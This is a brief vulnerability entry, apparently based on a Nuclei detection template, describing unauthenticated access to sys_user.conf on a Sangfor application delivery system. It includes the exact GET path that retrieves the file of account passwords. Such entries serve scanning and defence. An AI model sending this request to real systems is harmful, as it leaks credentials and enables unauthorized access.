# Vulnerability: Sangfor Application sys_user.conf Account Password Leakage
**Classification:** LFI
**Source:** Nuclei Template (`sangfor-sysuser-conf.yaml`)

## Description
Sangfor application delivery management system file sys_user.conf can be directly accessed without authorization, resulting in leakage of account and password

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/tmp/updateme/sinfor/ad/sys/sys_user.conf
```

